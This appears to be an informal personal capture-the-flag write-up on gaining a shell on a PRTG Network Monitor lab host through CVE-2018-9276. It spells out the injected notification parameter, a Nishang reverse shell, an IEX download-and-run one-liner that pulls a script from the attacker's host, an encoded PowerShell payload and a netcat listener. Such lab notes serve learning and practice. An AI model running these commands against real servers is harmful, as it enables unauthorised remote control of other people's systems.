Now upon googleing PRTG networkork monitor exploits i found this

https://www.rapid7.com/db/modules/exploit/windows/http/prtg_authenticated_rce/


also used the walkthrough and wirteup for this

Now

A Google search about the vulnerabilities yields a CVE for versions < 18.1.39 (CVE-2018-9276).


Now after going in 
	setup>notification>new notification(extreme righ side)

i put in the parameter to check if RCE is present 

test | ping -n 5 10.10.14.32

and i was able to ping myself

Now following the walkthrough


i installed nishang from github
https://github.com/samratashok/nishang


got a poswershell reverse tcp shell script


added below command at the end of the file

>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.32 -Port 1337

hosted a python server where shell file is located using

>python -m http.server

got the sheel script downlaod through rce in notification paramter using below command:

>IEX(new-object                        
net.webclient).downloadstring('http://10.10.14.32/reverse.ps1')


check it was getting downlaodaed on the python commnad verbose

but it was notworking so followed the walkthrough and endcoded the script and put it directly intho the RCE

using below command:

â”Œâ”€â”€(rootðŸ’€kali)-[~/Desktop/THM]
â””â”€# cat reverse.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard

this directly copied the output into by cliboad ( xclip command)

now pasted the injection into RCE 

>test | powershell -enc <paste copied data here>

started a netcat listener on port 1337

and after running the notification i got a shell on netcat listener
